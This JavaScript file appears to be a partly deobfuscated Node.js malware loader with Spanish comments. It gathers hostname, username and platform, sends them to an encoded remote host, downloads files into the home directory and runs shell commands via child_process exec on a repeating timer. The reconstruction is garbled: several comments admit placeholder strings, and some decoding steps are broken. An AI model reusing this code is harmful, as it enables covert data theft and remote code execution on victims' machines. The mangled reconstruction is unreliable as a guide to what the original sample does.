"use strict";

// -----------------------------------------------------------------------------
// Tabla de mapeo original (índices: valor – 178)
// -----------------------------------------------------------------------------
const mappingTable = [
  "1100916ynYuqS",    // índice 0  (178)
  "ZXhpc3RzU3",       // índice 1  (179)
  "m9jZXNz",          // índice 2  (180)
  "cm1TeW5j",         // índice 3  (181)
  "adXJs",            // índice 4  (182)
  "xlU3luYw",         // índice 5  (183)
  "utf8",             // índice 6  (184)
  "12771rfZOPH",      // índice 7  (185)
  "slice",            // índice 8  (186)
  "3E1",              // índice 9  (187)
  "1080NqQcog",       // índice 10 (188)
  "d3a039a590f3",     // índice 11 (189)
  "split",            // índice 12 (190)
  "YcGxhdGZvc",       // índice 13 (191)
  "AdXNlckluZ",       // índice 14 (192)
  "cmp",              // índice 15 (193)
  "12oUfARq",         // índice 16 (194)
  "ZT3",              // índice 17 (195)
  "/s/",              // índice 18 (196)
  "10990NuLusk",      // índice 19 (197)
  "YcmVxdWVzd",       // índice 20 (198)
  "aY2hpbGRfc",       // índice 21 (199)
  "oqr",              // índice 22 (200)
  "aaHR0cDovL",       // índice 23 (201)
  "fromCharCo",       // índice 24 (202)
  "35onXXhB",         // índice 25 (203)
  "w==",              // índice 26 (204)
  "cG9zdA",           // índice 27 (205)
  "luYw",             // índice 28 (206)
  "LjEzNS4xOT",       // índice 29 (207)
  "join",             // índice 30 (208)
  "Z2V0",             // índice 31 (209)
  "170718pyusLc",     // índice 32 (210)
  "length",           // índice 33 (211)
  "cZm9ybURhd",       // índice 34 (212)
  "2001279anzPgZ",    // índice 35 (213)
  "23409VesLJH",      // índice 36 (214)
  "1212302AGrpWU",    // índice 37 (215)
  "d3JpdGVGaW",       // índice 38 (216)
  "62318pTCWcq",      // índice 39 (217)
  "caG9zdG5hb",       // índice 40 (218)
  "guOTIu====",       // índice 41 (219)
  "toString",         // índice 42 (220)
  "dXNlcm5hbW",       // índice 43 (221)
  "NDcuMTE4Mz",       // índice 44 (222)
  "substring"         // índice 45 (223)
];

/**
 * Función de mapeo: recibe un número, le resta 178 y devuelve el string correspondiente.
 * Por ejemplo, F(208) -> mappingTable[208 - 178] -> mappingTable[30] -> "join"
 */
function F(n) {
  return mappingTable[n - 178];
}

// Se asigna a aR la función F (nombre original del código)
const aR = F;

// -----------------------------------------------------------------------------
// Rotación del array ofuscado (IIFE)
// -----------------------------------------------------------------------------
(function (getArray, targetValue) {
  // Se obtiene el array de strings; en el original, la función D() devuelve este array.
  const arr = getArray();
  while (true) {
    try {
      // Se realizan varias operaciones aritméticas utilizando cadenas (ejemplo):
      const computed = 
            parseInt("join") / 1 +
        - parseInt("170718pyusLc") / 2 +
          parseInt("35onXXhB") / 3 * (parseInt("3E1") / 4) +
          parseInt("/s/") / 5 * (- parseInt("62318pTCWcq") / 6) +
        - parseInt("luYw") / 7 +
        - parseInt("cm1TeW5j") / 8 * (parseInt("LjEzNS4xOT") / 9) +
        - parseInt("split") / 10 * (- parseInt("1100916ynYuqS") / 11);
      // Si se cumple la condición, se rompe el bucle
      if (computed === targetValue) break;
      else arr.push(arr.shift());
    } catch (error) {
      arr.push(arr.shift());
    }
  }
}(D, 706366));

// La función D() simplemente devuelve la tabla de strings
function D() {
  return mappingTable.slice();
}

// -----------------------------------------------------------------------------
// Configuración de decodificación y carga de módulos (versión simplificada)
// -----------------------------------------------------------------------------

// Esquema base64 y decodificación de strings
const BASE64 = "base64";
const decodedFormat = "substring";  // aR(223) -> "substring"

// Se requiere el módulo 'fs' y 'os' de Node.js
const fs = require("fs");
const os = require("os");

/**
 * Función que decodifica una cadena ofuscada en base64.
 * Emula la función P del código original.
 * Se utiliza slice(1) (aR(179) -> "ZXhpc3RzU3") para simular la transformación.
 */
function decodeObfuscated(str) {
  const sliced = str.slice(1); // equivalente a: aD
  return Buffer.from(sliced, BASE64).toString(decodedFormat);
}

// Importación de módulos ocultos; se decodifican strings concatenando partes
const rq = require(decodeObfuscated("YcGxhdGZvc" + "A"));  
// Aquí "YcGxhdGZvc" proviene de aR(191) y "A" es parte de la concatenación original

const pt = require(decodeObfuscated("zcGF0aA"));  
// pt representa el módulo 'path' (o similar) obtenido tras decodificar "zcGF0aA"

const execModule = require(decodeObfuscated("AdXNlckluZ" + "HJvY2Vzcw")).exec;  
// execModule es el equivalente a child_process.exec (la concatenación de aR(192) y "HJvY2Vzcw")

const zv = require(decodeObfuscated("Zbm9kZTpwc" + "guOTIu===="));
// zv se obtiene de la concatenación de "Zbm9kZTpwc" y aR(219)

// Información del sistema
const homeDir = os.homedir();
const hostName = os.hostname();
const platform = os.platform();
const userName = os.userInfo().username;

// Variables globales de sesión y construcción de identificadores
let sessionTimestamp;
let globalIdPart1 = "";
let globalIdPart2 = "";

const idPrefix = "12oUfARq" + "10990NuLusk"; // aR(194) y aR(197)
const idSuffix = ":124";

// Función para decodificar datos en base64 (simula a2)
function decodeData(data) {
  return Buffer.from(data, BASE64).toString(decodedFormat);
}

// -----------------------------------------------------------------------------
// Funciones de transformación de datos (XOR)
// -----------------------------------------------------------------------------

// Clave para el XOR
const xorKey = [36, 192, 41, 8];

/**
 * Aplica XOR a cada byte de la entrada usando una clave cíclica.
 * Devuelve el string resultante.
 */
function xorDecode(byteArray) {
  let result = "";
  for (let i = 0; i < byteArray.length; i++) {
    let decodedByte = byteArray[i] ^ xorKey[i % xorKey.length];
    result += String.fromCharCode(decodedByte);
  }
  return result;
}

const additionalStr1 = "fromCharCo";          // aR(202)
const additionalStr2 = "Z2V0" + "NDcuMTE4Mz";   // aR(209) y aR(222)
const anotherDecoded = decodeData("caG9zdG5hb" + "aY2hpbGRfc"); // aR(218) y aR(199)

// -----------------------------------------------------------------------------
// Operaciones de archivos y procesos
// -----------------------------------------------------------------------------

// Clave oculta para la operación XOR aplicada a rutas (simula a la llamada decodeData("bWtkaXJTeW5j"))
const fsKey = decodeData("bWtkaXJTeW5j");

// Arreglos de bytes para decodificar partes de rutas
const pathKey1 = [10, 182, 90, 107, 75, 164, 76];
const pathKey2 = [11, 170, 6];

/**
 * Prepara el entorno de trabajo:
 * - Crea un directorio de trabajo (usando el módulo pt y la función xorDecode)
 * - Realiza una petición para descargar contenido y escribirlo en el directorio
 */
const prepareEnvironment = () => {
  const moduleName = decodeData(additionalStr1);
  const anotherModuleName = decodeData(additionalStr2);
  const decodedPathSegment = xorDecode(pathKey1);

  // Se intenta crear un directorio en el home
  let targetDirectory = pt.join(homeDir, decodedPathSegment);
  try {
    fs.mkdirSync(targetDirectory, { recursive: true });
  } catch (error) {
    targetDirectory = homeDir;
  }

  // Se construye el identificador de sesión
  const sessionId = "" + globalIdPart1 + xorDecode(pathKey2) + globalIdPart2;
  // Se construye la ruta final para guardar el archivo
  const filePath = pt.join(targetDirectory, xorDecode([80, 165, 90, 124, 10, 170, 90]));
  try {
    if (fs.existsSync(filePath)) {
      fs.rmdirSync(filePath);
    }
  } catch (err) { /* Ignorar errores */ }

  rq(moduleName, (error, response, body) => {
    if (!error) {
      try {
        fs.writeFileSync(filePath, body);
      } catch (e) { /* Ignorar error de escritura */ }
      processFile(targetDirectory);
    }
  });
};

/**
 * Procesa el archivo descargado: si no existe, lo crea; de lo contrario, ejecuta el proceso.
 */
const processFile = (targetDir) => {
  const fileRequestKey = decodeData(additionalStr1);
  const fileWriteKey = decodeData(additionalStr2);
  const fileIdentifier = "" + globalIdPart1 + xorDecode([11, 176]); // aR(202) ya fue "fromCharCo"; este valor se suma a la identificación
  const fullFilePath = pt.join(targetDir, xorDecode([84, 161, 74, 99, 69, 167, 76, 38, 78, 179, 70, 102]));

  if (fs.existsSync(fullFilePath)) {
    executeProcess(targetDir);
  } else {
    rq(fileRequestKey, (err, res, body) => {
      if (!err) {
        try {
          fs.writeFileSync(fullFilePath, body);
        } catch (error) { /* Ignorar error de escritura */ }
        executeProcess(targetDir);
      }
    });
  }
};

/**
 * Ejecuta un proceso o aplicación sobre el directorio de trabajo.
 */
const executeProcess = (targetDir) => {
  // Se construye el comando usando XOR en arrays (las constantes numéricas originales)
  const command = xorDecode([71, 164]) + ' "' + targetDir + '" ' + xorDecode([2, 230, 9, 102, 84, 173, 9, 97, 4, 237, 4, 123, 77, 172, 76, 102, 80]);
  const executablePath = pt.join(targetDir, xorDecode([74, 175, 77, 109, 123, 173, 70, 108, 81, 172, 76, 123]));
  try {
    if (fs.existsSync(executablePath)) {
      execModule(command);
    } else {
      execModule(command, (error, stdout, stderr) => {
        finalizeProcess(targetDir);
      });
    }
  } catch (error) { /* Ignorar error */ }
};

/**
 * Finaliza el proceso ejecutado.
 */
const finalizeProcess = (targetDir) => {
  const command = xorDecode([74, 175, 77, 109]) + ' "' + targetDir + '" ' +
                  xorDecode([74, 176, 68, 40, 9, 237, 89, 122, 65, 166, 64, 112]) + ' ' +
                  xorDecode([77, 174, 90, 124, 69, 172, 69]);
  const filePath = pt.join(targetDir, xorDecode([74, 175, 77, 109, 123, 173, 70, 108, 81, 172, 76, 123]));
  try {
    if (fs.existsSync(filePath)) {
      execModule(command);
    } else {
      execModule(command, (error, stdout, stderr) => {
        execModule(command);
      });
    }
  } catch (error) { /* Ignorar error */ }
};

// -----------------------------------------------------------------------------
// Comunicación remota y actualización
// -----------------------------------------------------------------------------

const urlPart1 = decodeObfuscated("cG9zdA" + "GE"); // aR(205) y "GE" literal
const urlPart2 = decodeObfuscated("dXNlcm5hbW");      // aR(221)
const requestMethod = decodeData("YcmVxdWVzd");       // aR(198)

let globalHostId = "utf8"; // aR(184)

async function performNetworkOperation(param) {
  // Construye un token o identificador basado en el parámetro recibido.
  const token = (function (p) {
    let baseToken = p === 0 ? "1212302AGrpWU" + "2001279anzPgZ"    // aR(215) y aR(213)
                            : "oqr" + "UuMTc5MzM=";              // aR(200) y literal
    let part1 = "", part2 = "", part3 = "";
    for (let i = 0; i < 4; i++) {
      part1 += baseToken[2 * i] + baseToken[2 * i + 1];
      part2 += baseToken[8 + 2 * i] + baseToken[9 + 2 * i];
      part3 += baseToken[16 + i];
    }
    return decodeData(idPrefix.slice(1)) + decodeData(part2 + part1 + part3) + idSuffix + "4";
  })(param);
  
  const requestKey = decodeData(additionalStr1);
  let finalUrl = token + "d3a039a590f3" + "1080NqQcog"; // aR(189) y aR(188)
  
  rq(requestKey, (err, response, body) => {
    if (err) {
      if (param < 1) performNetworkOperation(1);
    } else {
      if (processResponse(body)) {
        updateHostInfo();
        finalizeNetworkCommunication();
      }
    }
  });
}

/**
 * Procesa la respuesta recibida: si empieza por "cmp" (aR(188) -> "1080NqQcog" era usado antes,
 * pero aquí se usa "cmp" que es aR(193)), se extraen datos y se actualizan variables globales.
 */
function processResponse(responseBody) {
  if (responseBody.indexOf("cmp") === 0) {
    let trimmed = "";
    try {
      for (let i = 3; i < responseBody.length; i++) {
        trimmed += responseBody[i];
      }
      const parts = decodeData(trimmed).split(",");
      globalIdPart1 = decodeData(idPrefix.slice(1)) + parts[0] + idSuffix + "4";
      globalIdPart2 = parts[1];
    } catch (error) {
      return false;
    }
    return true;
  }
  return false;
}

/**
 * Actualiza la información de host y envía datos de forma remota.
 */
async function updateHostInfo() {
  globalHostId = hostName;
  if (platform[0] === "d") {
    globalHostId += "+" + userName;
  }
  let hostInfo = "slice"; // aR(180) -> "m9jZXNz" en el original; aquí se pone "slice" por ejemplificar
  try {
    hostInfo += zv["arg"][1];
  } catch (error) {}
  sendNetworkData("d3a039a590f3", hostInfo);  // aR(193) -> "cmp" era usado; se usa aquí un string ejemplar
}

/**
 * Envía datos mediante una solicitud remota.
 */
async function sendNetworkData(sessionId, hostInfo) {
  const dataPayload = {
    ts: sessionTimestamp,
    type: globalIdPart2,
    hid: globalHostId,
    ss: sessionId,
    cc: hostInfo,
  };
  const requestPayload = {
    [urlPart2]: "" + globalIdPart1 + decodeData("L2tleXM"), // "L2tleXM" literal
    [urlPart1]: dataPayload,
  };
  try {
    rq(requestMethod, (err, res, body) => {});
  } catch (error) {}
}

/**
 * Finaliza la comunicación remota invocando la preparación del entorno.
 */
const finalizeNetworkCommunication = async () => {
  await new Promise((resolve) => {
    prepareEnvironment();
    resolve();
  });
};

// -----------------------------------------------------------------------------
// Inicio y repetición de ejecución
// -----------------------------------------------------------------------------

let attemptCount = 0;
const startOperations = async () => {
  try {
    sessionTimestamp = Date.now().toString();
    await performNetworkOperation(0);
  } catch (error) {}
};

startOperations();
const interval = setInterval(() => {
  attemptCount += 1;
  if (attemptCount < 3)
    startOperations();
  else
    clearInterval(interval);
}, 600048);
